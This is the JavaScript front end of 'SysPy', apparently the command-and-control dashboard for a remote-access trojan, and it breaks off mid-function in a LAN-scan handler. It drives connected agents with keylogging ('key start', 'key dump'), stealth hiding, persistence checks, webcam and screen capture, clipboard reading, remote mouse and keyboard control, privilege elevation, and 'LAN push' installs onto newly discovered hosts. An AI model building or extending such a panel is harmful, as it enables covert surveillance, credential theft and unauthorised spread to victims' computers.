/* SysPy Nordic Terminal Dashboard. Vanilla JS, no build step. */

"use strict";

const state = {

  token: localStorage.getItem("syspy_token") || "",

  agents: new Map(),

  selected: null,

  tab: "terminal",

  socket: null,

  live: null,

  files: { path: "This PC", viewing: null },

  history: JSON.parse(localStorage.getItem("syspy_history") || "[]"),

  historyIdx: -1,

  autoScroll: true,

  splitView: false,

  interactiveMouse: false,

  checked: new Set(),

  collapsed: new Set(),

  fe: {

    currentPath: "This PC",

    isThisPc: true,

    history: ["This PC"],

    historyIdx: 0,

    drives: [],

    specialFolders: {},

    items: [],

    selectedPaths: new Set(),

    pendingDownloads: new Map(),

    clipboard: { op: null, paths: [] },

    viewMode: "details",

    sortBy: "name",

    sortAsc: true,

    bookmarks: JSON.parse(localStorage.getItem("syspy_bookmarks") || "[]"),

    recents: JSON.parse(localStorage.getItem("syspy_recents") || "[]"),

    contextTarget: null,

    editor: {

      path: null,

      sha: null,

      encoding: "UTF-8",

      lineEnding: "CRLF",

      isModified: false,

    }

  }

};

/* A missing element used to throw during initialisation and kill every

   binding after it. Missing ids now return an inert stub. */

const _stub = new Proxy(function () {}, {

  get: (t, k) => (k === Symbol.toPrimitive ? () => '' : (k === 'classList' ? _stub : _stub)),

  set: () => true,

  apply: () => _stub,

  has: () => true,

});

const $ = (id) => document.getElementById(id) || _stub;

const COMMAND_SUGGESTIONS = [

  "info", "shot", "shot 50", "ls", "ps", "wifi", "hist", "clip.get",

  "clip.set", "persist.status", "stealth.info", "stealth.hide", "stealth.show",

  "power.lock", "power.sleep", "power.restart", "power.shutdown",

  "vol mute", "vol up", "vol down", "cam", "burst", "key start", "key dump",

  "key stop", "type ", "mouse click", "ping", "help",

  "cmd ", "py ", "ps1 ", "whoami", "ipconfig", "dir", "eval "

];

/* ------------------------------------------------------------------ */

/* Adaptive Typewriter Engine                                         */

/* ------------------------------------------------------------------ */

const Typewriter = {
  _jobs: new Map(),

  stream(termEl, text, cls, onDone) {
    if (!text) return;
    const THRESHOLD = 1500;
    const CHARS_PER_TICK = 3;
    const TICK_MS = 10;

    if (text.length >= THRESHOLD) {
      this._appendLine(termEl, text, cls);
      if (onDone) onDone();
      return;
    }

    const jobId = Symbol();
    const line = document.createElement('div');
    if (cls) line.className = cls;
    const cursor = document.createElement('span');
    cursor.className = 'tw-cursor';
    line.appendChild(cursor);
    termEl.appendChild(line);
    if (state.autoScroll) termEl.scrollTop = termEl.scrollHeight;

    let pos = 0;
    let aborted = false;
    const chars = [...text];

    const skip = () => {
      if (aborted) return;
      aborted = true;
      clearInterval(interval);
      line.textContent = text;
      if (onDone) onDone();
    };

    const interval = setInterval(() => {
      if (aborted) return;
      const end = Math.min(pos + CHARS_PER_TICK, chars.length);
      const slice = chars.slice(0, end).join('');
      pos = end;
      line.textContent = slice;
      if (pos < chars.length) {
        line.appendChild(cursor);
      }
      if (state.autoScroll) termEl.scrollTop = termEl.scrollHeight;
      if (pos >= chars.length) {
        clearInterval(interval);
        this._jobs.delete(jobId);
        if (onDone) onDone();
      }
    }, TICK_MS);

    this._jobs.set(jobId, skip);

    const skipOnce = () => {
      skip();
      termEl.removeEventListener('click', skipOnce);
      termEl.removeEventListener('keydown', skipOnce);
    };
    termEl.addEventListener('click', skipOnce, { once: true });
    termEl.addEventListener('keydown', skipOnce, { once: true });

    return skip;
  },

  _appendLine(termEl, text, cls) {
    const line = document.createElement('div');
    if (cls) line.className = cls;
    line.textContent = text;
    termEl.appendChild(line);
    if (state.autoScroll) termEl.scrollTop = termEl.scrollHeight;
  },

  skipAll() {
    for (const skip of this._jobs.values()) skip();
    this._jobs.clear();
  }
};

function decodeReveal(el, finalText, durationMs = 160) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_';
  let frame = 0;
  const totalFrames = Math.ceil(durationMs / 30);
  const interval = setInterval(() => {
    frame++;
    if (frame >= totalFrames) {
      clearInterval(interval);
      el.textContent = finalText;
      return;
    }
    const progress = frame / totalFrames;
    const locked = Math.floor(progress * finalText.length);
    let result = finalText.slice(0, locked);
    for (let i = locked; i < finalText.length; i++) {
      result += finalText[i] === ' ' ? ' ' : chars[Math.floor(Math.random() * chars.length)];
    }
    el.textContent = result;
  }, 30);
}

/* ------------------------------------------------------------------ */

/* HTTP API                                                           */

/* ------------------------------------------------------------------ */

async function api(path, options = {}) {

  const headers = Object.assign({ "Content-Type": "application/json" }, options.headers || {});

  if (state.token) headers.Authorization = "Bearer " + state.token;

  const response = await fetch(path, Object.assign({}, options, { headers }));

  if (response.status === 401) { logout(); throw new Error("unauthorised"); }

  const type = response.headers.get("Content-Type") || "";

  return type.includes("json") ? response.json() : response.text();

}

async function sendCommand(command) {

  if (!state.selected || !command) return;

  const target = state.agents.get(state.selected);

  if (target && target.__ghost) {

    appendTerminal(state.selected, "$ " + command, "in");

    appendTerminal(state.selected, "not managed yet - use LAN push, or run the one-liner here", "sys");

    return;

  }

  appendTerminal(state.selected, "$ " + command, "in");

  try {

    const result = await api("/api/cmd", {

      method: "POST",

      body: JSON.stringify({ agents: [state.selected], cmd: command }),

    });

    if (result && result.sent === 0 && result.queued > 0) {

      appendTerminal(state.selected, "⏳ queued — agent reconnecting, will deliver when online", "sys");

    } else if (result && result.sent === 0 && result.queued === 0) {

      appendTerminal(state.selected, "✗ agent not reachable — check connection", "err");

    }

  } catch (e) {

    appendTerminal(state.selected, "✗ failed to send: " + e.message, "err");

  }

}

/* ------------------------------------------------------------------ */

/* Auth                                                               */

/* ------------------------------------------------------------------ */

async function handleLogin(event) {

  if (event && event.preventDefault) event.preventDefault();

  const errorEl = $("login-error");

  if (errorEl) errorEl.textContent = "";

  const btn = $("login-btn");

  const pwdInput = $("password");

  const pwd = (pwdInput ? pwdInput.value : "").trim();

  if (!pwd) {

    if (errorEl) errorEl.textContent = "Please enter the controller password.";

    return;

  }

  if (btn) { btn.textContent = "Connecting..."; btn.disabled = true; }

  try {

    const resp = await fetch("/api/login", {

      method: "POST",

      headers: { "Content-Type": "application/json" },

      body: JSON.stringify({ password: pwd }),

    });

    const data = await resp.json().catch(() => ({}));

    if (!resp.ok || !data.token) {

      if (btn) { btn.textContent = "Connect"; btn.disabled = false; }

      if (errorEl) errorEl.textContent = data.error === "wrong password"

        ? "Access denied: incorrect passphrase."

        : (data.error || "Login failed");

      return;

    }

    state.token = data.token;

    localStorage.setItem("syspy_token", state.token);

    if (btn) btn.textContent = "Success";

    start();

  } catch (err) {

    if (btn) { btn.textContent = "Connect"; btn.disabled = false; }

    if (errorEl) errorEl.textContent = "Connection error: " + err.message;

  }

}

window.handleLogin = handleLogin;

if ($("login-form")) $("login-form").onsubmit = handleLogin;

if ($("login-btn")) $("login-btn").onclick = handleLogin;

function logout() {

  state.token = "";

  localStorage.removeItem("syspy_token");

  $("app").classList.add("hidden");

  $("login").classList.remove("hidden");

}

/* ------------------------------------------------------------------ */

/* Boot                                                               */

/* ------------------------------------------------------------------ */

async function start() {

  $("login").classList.add("hidden");

  $("app").classList.remove("hidden");

  try {

    const snapshot = await api("/api/state");

    snapshot.agents.forEach(upsertAgent);

    setRelay(snapshot.relay);

    renderAgents();

  } catch (error) { /* handled */ }

  connect();

}

let _backoff = 500;

function nextDelay() {

  _backoff = Math.min(Math.round(_backoff * 1.8), 30000);

  return _backoff + Math.round(Math.random() * 400);

}

async function connect() {

  try {

    const _r = await fetch('/api/ws-ticket', {

      method: 'POST',

      headers: (typeof token !== 'undefined' && token) ? { Authorization: 'Bearer ' + token } : {},

    });

    if (_r.ok) window.__wsTicket = (await _r.json()).ticket;

  } catch (_e) { /* fall back to the token param */ }

  _backoff = 500;

  if (state.socket) {

    try { state.socket.close(); } catch(e) {}

  }

  const protocol = location.protocol === "https:" ? "wss:" : "ws:";

  const socket = new WebSocket(protocol + '//' + location.host + '/ws?ticket=' +

    encodeURIComponent(window.__wsTicket || '') +

    (window.__wsTicket ? '' : '&token=' + encodeURIComponent(typeof token !== 'undefined' ? token : '')));

  state.socket = socket;

  // Browser keepalive ping every 5 seconds so Render proxy never drops the WebSocket

  let pingInterval = setInterval(() => {

    if (socket.readyState === WebSocket.OPEN) {

      try { socket.send(JSON.stringify({ type: "ping" })); } catch(e) {}

    }

  }, 5000);

  socket.onmessage = (event) => {

    try {

      const data = JSON.parse(event.data);

      if (data.type === "pong") return;

      handleEvent(data);

    } catch(e) {}

  };

  socket.onclose = () => {

    clearInterval(pingInterval);

    setWsStatus(false);

    setTimeout(connect, nextDelay());

  };

  socket.onopen = () => { /* wait for snapshot/relay event from server */ };

}

/* ------------------------------------------------------------------ */

/* Events                                                             */

/* ------------------------------------------------------------------ */

function handleEvent(event) {

  switch (event.type) {

    case "snapshot":

      state.agents.clear();

      event.agents.forEach(upsertAgent);

      renderAgents();

      setRelay(event.relay);

      break;

    case "agent_new":

      upsertAgent(event.agent);

      renderAgents();

      toast(`[ONLINE] ${event.agent.display}`);

      break;

    case "agent":

      upsertAgent(event.agent);

      renderAgents();

      renderHeader();

      break;

    case "agent_deleted":

      state.agents.delete(event.id);

      if (state.selected === event.id) {

        state.selected = Array.from(state.agents.keys())[0] || null;

      }

      renderAgents();

      renderHeader();

      break;

    case "agent_lost":

    case "agent_offline":

      if (event.agent) {

        upsertAgent(event.agent);

      } else {

        const a = state.agents.get(event.id);

        if (a) a.online = false;

      }

      renderAgents();

      renderHeader();

      toast(`[OFFLINE] Agent disconnected`);

      break;

    case "relay":

      setRelay(event.up);

      break;

    case "output":

      appendTerminal(event.id, event.text, "out");

      break;

    case "note":

    case "progress":

      appendTerminal(event.id, event.text, "sys");

      break;

    case "stats":

      applyStats(event.id, event.stats);

      break;

    case "keys":

      appendKeys(event.id, event.text);

      break;

    case "json":

      handleJson(event.id, event.payload);

      break;

    case "file":

      appendTerminal(event.id, `received ${event.name} (${event.size} bytes)`, "ok");

      const lowerName = (event.name || "").toLowerCase();

      let pendingInfo = null;

      if (state.fe.pendingDownloads && state.fe.pendingDownloads.has(lowerName)) {

        pendingInfo = state.fe.pendingDownloads.get(lowerName);

        state.fe.pendingDownloads.delete(lowerName);

      }

      const isScreenCapture = /^(screenshot\.png|burst\d+\.png|webcam\.jpg)$/i.test(event.name);

      if (isScreenCapture && !pendingInfo && event.id === state.selected) {

        showImage(event.url);

      } else {

        if (pendingInfo) {

          updateTransferItem(pendingInfo.tid, `Completed (${humanSize(event.size)})`, 100, true, false);

        } else {

          const tid = "dl-" + Date.now();

          addTransferItem(tid, `${event.name}`, "DOWNLOAD");

          updateTransferItem(tid, `Completed (${humanSize(event.size)})`, 100, true, false);

        }

        triggerBrowserDownload(event.url, event.name);

        toast(`Downloaded ${event.name} (${humanSize(event.size)})`);

      }

      break;

  }

}

function upsertAgent(agent) {

  // Smart detection: Prune old stale entry only when MAC hardware address matches exactly

  const mac = agent.mac || "";

  if (mac) {

    for (const [existingId, existing] of state.agents.entries()) {

      if (existingId !== agent.id && existing.mac && existing.mac === mac) {

        state.agents.delete(existingId);

        if (state.selected === existingId) state.selected = agent.id;

      }

    }

  }

  state.agents.set(agent.id, agent);

  if (!state.selected) state.selected = agent.id;

}

/* ------------------------------------------------------------------ */

/* Rendering                                                          */

/* ------------------------------------------------------------------ */

function updateSelBar() {

  const bar = $("sel-bar");

  if (!bar) return;

  const count = state.checked.size;

  $("sel-count").textContent = `${count} selected`;

  if (count > 0 || ($("sel-mode") && $("sel-mode").value !== "selected")) {

    bar.classList.remove("hidden");

  } else {

    bar.classList.add("hidden");

  }

}

function toggleCheck(id, on) {

  if (on) state.checked.add(id);

  else state.checked.delete(id);

  updateSelBar();

}

function selectAll(on) {

  for (const a of state.agents.values()) {

    if (on) state.checked.add(a.id);

    else state.checked.delete(a.id);

  }

  renderTree();

  updateSelBar();

}

async function bulk(verb, extra = {}) {

  const mode = $("sel-mode") ? $("sel-mode").value : "selected";

  const targets = mode === "selected" ? Array.from(state.checked) : mode;

  try {

    const res = await api("/api/action", {

      method: "POST",

      body: JSON.stringify({ verb, targets, ...extra })

    });

    console.log("Bulk action result:", res);

  } catch (err) {

    alert("Bulk action failed: " + err);

  }

}

function renderSelBar() { updateSelBar(); }

function renderTree() {

  const treeEl = $("agent-tree");

  if (!treeEl) return;

  treeEl.innerHTML = "";

  const realCount = [...state.agents.values()].filter(a => !a.__ghost).length;

  const ghostCount = state.agents.size - realCount;

  $("agent-count").textContent =

    `${realCount} HOST${realCount === 1 ? "" : "S"}` + (ghostCount ? ` +${ghostCount} seen` : "");

  const agentsList = Array.from(state.agents.values());

  const byParent = new Map();

  for (const a of agentsList) {

    const k = a.parent ? "agent:" + a.parent : "__root__";

    if (!byParent.has(k)) byParent.set(k, []);

    byParent.get(k).push(a);

  }

  function walk(key, depth) {

    const children = byParent.get(key) || [];

    for (const a of children) {

      const item = document.createElement("li");

      item.className = "agent-item"

        + (a.id === state.selected ? " selected" : "")

        + (a.online === false ? " offline" : "")

        + (a.__ghost ? " ghost" : "");

      item.style.paddingLeft = `${depth * 12 + 4}px`;

      const cpu = Math.round((a.stats && a.stats.cpu) || 0);

      const ram = Math.round((a.stats && a.stats.ram) || 0);

      const isChecked = state.checked.has(a.id);

      const isOnline = a.online !== false;

      const isAdmin = a.admin;

      // Name row
      const nameRow = document.createElement("div");

      nameRow.className = "agent-name-row";

      if (!a.__ghost) {

        const chk = document.createElement("input");

        chk.type = "checkbox";

        chk.className = "agent-chk";

        chk.dataset.id = a.id;

        chk.checked = isChecked;

        chk.style.cssText = "margin:0;flex-shrink:0;";

        chk.addEventListener("change", e => {

          e.stopPropagation();

          if (chk.checked) state.checked.add(a.id);

          else state.checked.delete(a.id);

          renderSelBar();

        });

        nameRow.appendChild(chk);

      }

      const dot = document.createElement("span");

      dot.className = "agent-status-dot " + (isOnline ? "online" : "offline");

      nameRow.appendChild(dot);

      const nameEl = document.createElement("span");

      nameEl.className = "agent-name";

      nameEl.textContent = a.display;

      nameRow.appendChild(nameEl);

      if (isAdmin) {

        const admBadge = document.createElement("span");

        admBadge.className = "badge admin";

        admBadge.textContent = "ADM";

        nameRow.appendChild(admBadge);

      }

      const statusBadge = document.createElement("span");

      statusBadge.className = "badge " + (isOnline ? "online" : "offline");

      statusBadge.textContent = isOnline ? "ON" : "OFF";

      nameRow.appendChild(statusBadge);

      item.appendChild(nameRow);

      // Dense meta row
      const meta = document.createElement("div");

      meta.className = "agent-meta";

      meta.textContent = `hop:${a.hop || 0}  ${(a.info && a.info.address) ? a.info.address + "  " : ""}${escapeHtml((a.info && a.info.system) || "")}`;

      item.appendChild(meta);

      // CPU/RAM bars
      const bars = document.createElement("div");

      bars.className = "agent-bars";

      bars.innerHTML = `<div class="bar" title="CPU ${cpu}%"><i style="width:${cpu}%"></i></div><div class="bar" title="RAM ${ram}%"><i class="ram" style="width:${ram}%"></i></div>`;

      item.appendChild(bars);

      // Hover quick-action buttons
      if (!a.__ghost) {

        const qa = document.createElement("div");

        qa.className = "agent-quick-actions";

        qa.innerHTML = `
          <button class="agent-quick-btn" data-action="terminal" title="Open Terminal">&#62;_&nbsp;Term</button>
          <button class="agent-quick-btn" data-action="screen" title="Live Screen">&#9724;&nbsp;Screen</button>
          <button class="agent-quick-btn" data-action="files" title="File Explorer">&#128193;&nbsp;Files</button>
          <button class="agent-quick-btn" title="Rename" data-rename="${a.id}">&#9998;</button>
          <button class="agent-quick-btn danger" title="Remove" data-del="${a.id}">&#10005;</button>
        `;

        qa.addEventListener("click", e => {

          e.stopPropagation();

          const btn = e.target.closest("[data-action],[data-rename],[data-del]");

          if (!btn) return;

          if (btn.dataset.action === "terminal") { state.selected = a.id; document.querySelector('[data-tab="terminal"]') && document.querySelector('[data-tab="terminal"]').click(); }

          else if (btn.dataset.action === "screen") { state.selected = a.id; document.querySelector('[data-tab="screen"]') && document.querySelector('[data-tab="screen"]').click(); }

          else if (btn.dataset.action === "files") { state.selected = a.id; document.querySelector('[data-tab="files"]') && document.querySelector('[data-tab="files"]').click(); }

          else if (btn.dataset.rename) {

            const nick = prompt("Rename host:", a.display);

            if (nick !== null) api("/api/nick", { method: "POST", body: JSON.stringify({ agent: a.id, nick: nick.trim() }) });

          }

          else if (btn.dataset.del) {

            if (confirm(`Remove "${a.display}" from dashboard?`)) {

              state.agents.delete(a.id);

              if (state.selected === a.id) state.selected = Array.from(state.agents.keys())[0] || null;

              api("/api/agent/delete", { method: "POST", body: JSON.stringify({ agent: a.id }) }).catch(() => {});

              renderTree();

              renderHeader();

            }

          }

        });

        item.appendChild(qa);

      }

      item.onclick = e => {

        if (e.target.closest(".agent-quick-actions") || e.target.type === "checkbox") return;

        state.selected = a.id;

        renderTree();

        renderHeader();

        refreshFiles();

      };

      item.ondblclick = () => {

        const nick = prompt("Rename Host Nickname:", a.display);

        if (nick !== null) api("/api/nick", { method: "POST", body: JSON.stringify({ agent: a.id, nick: nick.trim() }) });

      };

      if (a.__ghost) {

        item.title = "Discovered on LAN — not managed yet. Use LAN push to install.";

      }

      treeEl.appendChild(item);

      walk(a.id, depth + 1);

    }

  }

  walk("__root__", 0);

}

function renderAgents() {

  renderTree();

  renderHeader();

}

function renderHeader() {
  const agent = state.agents.get(state.selected);
  const nameEl = $("current-name");
  const nameText = agent ? `${agent.display}${agent.online === false ? " [OFFLINE]" : ""}` : "No Host Selected";
  if (nameEl && nameEl.textContent !== nameText) {
    decodeReveal(nameEl, nameText, 160);
  } else if (nameEl) {
    nameEl.textContent = nameText;
  }

  $("current-meta").textContent = agent

    ? `v${agent.version} - PID ${agent.pid} - ${agent.admin ? "ELEVATED (ADMIN)" : "USER"} - ${(agent.info && agent.info.address) || ""} - ${agent.online === false ? "LAST SEEN: " + new Date(agent.last_seen * 1000).toLocaleTimeString() : "CONNECTED"}`

    : "";

  const elevBtn = $("elevate-btn");

  if (elevBtn) {

    if (agent && agent.online !== false && !agent.admin) {

      elevBtn.classList.remove("hidden");

    } else {

      elevBtn.classList.add("hidden");

    }

  }

}

function applyStats(id, stats) {

  const agent = state.agents.get(id);

  if (!agent) return;

  agent.stats = stats;

  renderAgents();

  if (id === state.selected) renderSystemCards();

}

function setRelay(up) {

  $("relay-dot").classList.toggle("up", !!up);

  $("relay-label").textContent = up ? "RELAY CONNECTED" : "RELAY DISCONNECTED";

}

function setWsStatus(connected) {

  if (!connected) {

    // If the browser websocket to controller dropped, don't show "RELAY DISCONNECTED", show WS reconnecting

    $("relay-dot").classList.remove("up");

    $("relay-label").textContent = "DASHBOARD RECONNECTING...";

  }

}

/* ------------------------------------------------------------------ */

/* Terminal Controls & Split View                                     */

/* ------------------------------------------------------------------ */

function appendTerminal(id, text, kind) {

  if (id !== state.selected) return;

  const terminal = $("terminal");

  // Use adaptive typewriter for command echo (kind==="in") and output
  // For system messages (sys, err), append directly for speed
  if (kind === "in") {
    Typewriter.stream(terminal, text, "in");
  } else if (kind === "err") {
    Typewriter._appendLine(terminal, text, "err");
  } else if (kind === "sys") {
    Typewriter._appendLine(terminal, text, "sys");
  } else if (kind === "ok") {
    Typewriter.stream(terminal, text, "ok");
  } else {
    Typewriter.stream(terminal, text, null);
  }

}

$("term-clear-btn").onclick = () => {

  $("terminal").innerHTML = "";

};

$("term-copy-btn").onclick = () => {

  const text = $("terminal").innerText;

  navigator.clipboard.writeText(text);

  toast("Console log copied to clipboard");

};

$("term-autoscroll-btn").onclick = () => {

  state.autoScroll = !state.autoScroll;

  $("term-autoscroll-btn").classList.toggle("active", state.autoScroll);

  $("term-autoscroll-btn").textContent = `Scroll: ${state.autoScroll ? "Auto" : "Paused"}`;

};

$("term-split-btn").onclick = () => {

  state.splitView = !state.splitView;

  $("term-split-btn").classList.toggle("active", state.splitView);

  $("split-screen-preview").classList.toggle("hidden", !state.splitView);

  if (state.splitView && $("screen-img").src) {

    $("split-screen-img").src = $("screen-img").src;

  }

};

$("split-close-btn").onclick = () => {

  state.splitView = false;

  $("term-split-btn").classList.remove("active");

  $("split-screen-preview").classList.add("hidden");

};

/* Terminal Command History (Up/Down) & Tab Completion */

$("command-form").addEventListener("submit", (event) => {

  event.preventDefault();

  const input = $("command");

  const cmd = input.value.trim();

  if (!cmd) return;

  

  state.history.push(cmd);

  if (state.history.length > 50) state.history.shift();

  localStorage.setItem("syspy_history", JSON.stringify(state.history));

  state.historyIdx = -1;

  sendCommand(cmd);

  input.value = "";

});

$("command").addEventListener("keydown", (e) => {

  if (e.key === "ArrowUp") {

    e.preventDefault();

    if (!state.history.length) return;

    if (state.historyIdx === -1) state.historyIdx = state.history.length - 1;

    else if (state.historyIdx > 0) state.historyIdx--;

    $("command").value = state.history[state.historyIdx] || "";

  } else if (e.key === "ArrowDown") {

    e.preventDefault();

    if (state.historyIdx !== -1 && state.historyIdx < state.history.length - 1) {

      state.historyIdx++;

      $("command").value = state.history[state.historyIdx] || "";

    } else {

      state.historyIdx = -1;

      $("command").value = "";

    }

  } else if (e.key === "Tab") {

    e.preventDefault();

    const current = $("command").value;

    const match = COMMAND_SUGGESTIONS.find(c => c.startsWith(current));

    if (match) $("command").value = match;

  }

});

/* Quick buttons & data-quick handlers */

function setupQuickButtons() {

  const quickBox = $("quick");

  quickBox.innerHTML = "";

  [

    "info", "shot", "cmd whoami", "ipconfig", "py print('hello from python')",

    "ls", "ps", "wifi", "persist.status", "vol mute", "cam"

  ].forEach((command) => {

    const button = document.createElement("button");

    button.textContent = command;

    button.onclick = () => sendCommand(command);

    quickBox.appendChild(button);

  });

  document.querySelectorAll("[data-quick]").forEach((button) => {

    button.onclick = () => sendCommand(button.dataset.quick);

  });

}

setupQuickButtons();

/* ------------------------------------------------------------------ */

/* Screen Viewer & Interactive Remote Control                         */

/* ------------------------------------------------------------------ */

function showImage(url) {

  const image = $("screen-img");

  const fullUrl = url + "?t=" + Date.now();

  image.src = fullUrl;

  image.onload = () => {

    image.classList.add("ready");

    $("screen-empty").classList.add("hidden");

    $("screen-meta").textContent = `CAP: ${image.naturalWidth}x${image.naturalHeight}px (${new Date().toLocaleTimeString()})`;

    if (state.splitView) {

      $("split-screen-img").src = fullUrl;

    }

  };

}

$("live-btn").onclick = () => {

  if (state.live) {

    clearInterval(state.live);

    state.live = null;

    $("live-btn").textContent = "Live Stream: OFF";

    $("live-btn").classList.remove("primary");

    return;

  }

  $("live-btn").textContent = "Live Stream: 2s";

  $("live-btn").classList.add("primary");

  const tick = () => state.selected && api("/api/cmd", {

    method: "POST",

    body: JSON.stringify({ agents: [state.selected], cmd: "shot 50" }),

  });

  tick();

  state.live = setInterval(tick, 2000);

};

/* Fullscreen toggle */

$("fs-btn").onclick = () => {

  const wrap = $("screen-interactive-wrap");

  wrap.classList.toggle("fullscreen-mode");

  $("fs-btn").textContent = wrap.classList.contains("fullscreen-mode") ? "Exit Fullscreen" : "Fullscreen";

};

/* Interactive Mouse & Keyboard Control on Screen */

$("interactive-mouse-toggle").onchange = (e) => {

  state.interactiveMouse = e.target.checked;

  toast(state.interactiveMouse ? "Interactive control ACTIVE. Click on screen to click." : "Interactive control OFF.");

};

$("screen-img").addEventListener("click", (e) => {

  if (!state.interactiveMouse || !state.selected) return;

  const img = $("screen-img");

  const rect = img.getBoundingClientRect();

  const scaleX = img.naturalWidth / rect.width;

  const scaleY = img.naturalHeight / rect.height;

  const x = Math.round((e.clientX - rect.left) * scaleX);

  const y = Math.round((e.clientY - rect.top) * scaleY);

  sendCommand(`mouse clickat ${x} ${y}`);

  toast(`Click at (${x}, ${y}) sent`);

});

$("screen-img").addEventListener("contextmenu", (e) => {

  if (!state.interactiveMouse || !state.selected) return;

  e.preventDefault();

  const img = $("screen-img");

  const rect = img.getBoundingClientRect();

  const scaleX = img.naturalWidth / rect.width;

  const scaleY = img.naturalHeight / rect.height;

  const x = Math.round((e.clientX - rect.left) * scaleX);

  const y = Math.round((e.clientY - rect.top) * scaleY);

  sendCommand(`mouse rightat ${x} ${y}`);

  toast(`Right-click at (${x}, ${y}) sent`);

});

$("screen-img").addEventListener("keydown", (e) => {

  if (!state.interactiveMouse || !state.selected) return;

  if (e.key.length === 1) {

    sendCommand(`type ${e.key}`);

  }

});

$("download-screen-btn").onclick = () => {

  const img = $("screen-img");

  if (!img.src) return toast("No image to download");

  const a = document.createElement("a");

  a.href = img.src;

  a.download = `screenshot_${Date.now()}.png`;

  a.click();

};

/* ------------------------------------------------------------------ */

/* Windows File Explorer & Monaco Remote Editor                       */

/* ------------------------------------------------------------------ */

let monacoLoaded = false;

let monacoEditorInstance = null;

function initMonacoLoader() {

  if (typeof window.require !== "undefined" && window.require.config) {

    try {

      window.require.config({

        paths: { vs: "https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.45.0/min/vs" }

      });

      window.require(["vs/editor/editor.main"], () => {

        monacoLoaded = true;

      });

    } catch (e) {

      console.warn("Monaco loader failed, fallback textarea will be used", e);

    }

  }

}

initMonacoLoader();

function getFileExtension(filename) {

  const idx = filename.lastIndexOf(".");

  return idx > 0 ? filename.slice(idx + 1).toLowerCase() : "";

}

function getMonacoLanguage(filename) {

  const ext = getFileExtension(filename);

  const langMap = {

    py: "python", js: "javascript", mjs: "javascript", cjs: "javascript",

    ts: "typescript", json: "json", html: "html", htm: "html",

    css: "css", scss: "scss", less: "less", bat: "bat", cmd: "bat",

    ps1: "powershell", sh: "shell", bash: "shell", md: "markdown",

    yaml: "yaml", yml: "yaml", xml: "xml", sql: "sql",

    c: "c", h: "c", cpp: "cpp", hpp: "cpp", rs: "rust",

    go: "go", java: "java", php: "php", rb: "ruby",

    ini: "ini", cfg: "ini", toml: "ini", txt: "plaintext", log: "plaintext"

  };

  return langMap[ext] || "plaintext";

}

function getFileTypeDescription(name, isDir) {

  if (isDir) return "File folder";

  const ext = getFileExtension(name);

  const typeMap = {

    txt: "Text Document", log: "Log File", py: "Python Source File",

    js: "JavaScript File", ts: "TypeScript File", json: "JSON Document",

    html: "HTML Document", css: "CSS Stylesheet", md: "Markdown Document",

    exe: "Application", msi: "Windows Installer", bat: "Windows Batch File",

    cmd: "Command Script", ps1: "PowerShell Script", zip: "Compressed (zipped) Folder",

    rar: "WinRAR Archive", "7z": "7-Zip Archive", tar: "TAR Archive",

    gz: "GZ Archive", pdf: "PDF Document", png: "PNG Image",

    jpg: "JPEG Image", jpeg: "JPEG Image", gif: "GIF Image",

    bmp: "Bitmap Image", ico: "Icon File", svg: "SVG Image",

    mp3: "MP3 Audio", wav: "WAV Audio", mp4: "MP4 Video",

    mkv: "MKV Video", dll: "Dynamic Link Library", sys: "System File",

    ini: "Configuration Settings", cfg: "Config File", reg: "Registration Entries"

  };

  return typeMap[ext] || (ext ? `${ext.toUpperCase()} File` : "File");

}

function getFileIcon(name, isDir) {

  if (isDir) return "📁";

  const ext = getFileExtension(name);

  if (["png", "jpg", "jpeg", "gif", "bmp", "ico", "webp", "svg"].includes(ext)) return "🖼️";

  if (["mp4", "mkv", "avi", "mov", "wmv"].includes(ext)) return "🎬";

  if (["mp3", "wav", "flac", "aac", "ogg"].includes(ext)) return "🎵";

  if (["zip", "rar", "7z", "tar", "gz", "bz2"].includes(ext)) return "📦";

  if (["exe", "msi"].includes(ext)) return "⚙️";

  if (["bat", "cmd", "ps1", "vbs"].includes(ext)) return "⚡";

  if (["py", "js", "ts", "json", "html", "css", "c", "cpp", "h", "rs", "go", "java"].includes(ext)) return "📄";

  if (["txt", "log", "md", "doc", "docx", "ini", "cfg"].includes(ext)) return "📝";

  if (ext === "pdf") return "📕";

  return "📄";

}

function getDriveIcon(driveType) {

  const typeStr = String(driveType || "").toLowerCase();

  if (typeStr.includes("removable") || typeStr.includes("usb")) return "💾";

  if (typeStr.includes("cd") || typeStr.includes("dvd")) return "💿";

  if (typeStr.includes("network") || typeStr.includes("remote")) return "🌐";

  if (typeStr.includes("ram")) return "⚡";

  return "🖴";

}

/* Master JSON event dispatcher for files module */

function handleJson(id, payload) {

  if (id !== state.selected) return;

  const kind = payload.kind;

  if (kind === "drives") {

    state.fe.drives = payload.drives || [];

    state.fe.specialFolders = payload.special_folders || {};

    renderSidebar();

    if (state.fe.currentPath === "This PC") {

      renderThisPc();

    }

  } else if (kind === "listing") {

    if (payload.error) {

      toast("Access/Folder Error: " + payload.error);

    }

    if (payload.is_this_pc) {

      state.fe.isThisPc = true;

      state.fe.currentPath = "This PC";

      state.fe.drives = payload.drives || [];

      state.fe.specialFolders = payload.special_folders || {};

      renderSidebar();

      renderThisPc();

    } else {

      state.fe.isThisPc = false;

      state.fe.currentPath = payload.path;

      state.fe.items = payload.items || [];

      state.fe.activeDriveInfo = payload.stats || null;

      if (payload.special_folders) {

        state.fe.specialFolders = payload.special_folders;

      }

      renderSidebar();

      renderBreadcrumbs();

      renderItemsView();

      addRecentLocation(payload.path);

    }

    updateNavButtons();

  } else if (kind === "file_content") {

    if (payload.error) {

      toast("Error loading file: " + payload.error);

      return;

    }

    openEditorWithContent(payload);

  } else if (kind === "save_result") {

    if (payload.conflict) {

      const overwrite = confirm("CONFLICT DETECTED: The file has been modified on the remote PC by another process since you opened it.\n\nDo you want to overwrite it anyway?");

      if (overwrite) {

        saveEditorContent(true);

      }

    } else if (payload.success) {

      state.fe.editor.sha = payload.sha;

      state.fe.editor.isModified = false;

      $("fe-editor-dirty").classList.add("hidden");

      $("fe-editor-status").textContent = "Saved";

      toast("File saved successfully to remote PC");

      if (!state.fe.isThisPc) {

        sendCommand(`fs.list "${state.fe.currentPath}"`);

      }

    } else {

      toast("Save failed: " + (payload.error || "Unknown error"));

      $("fe-editor-status").textContent = "Save failed";

    }

  } else if (kind === "properties") {

    renderPropertiesModal(payload);

  } else if (kind === "search_results") {

    renderSearchResults(payload);

  } else if (kind === "lan_scan") {

    (payload.hosts || []).forEach(h => {

      if (h.is_self) return;

      const hostId = "lan:" + h.ip;
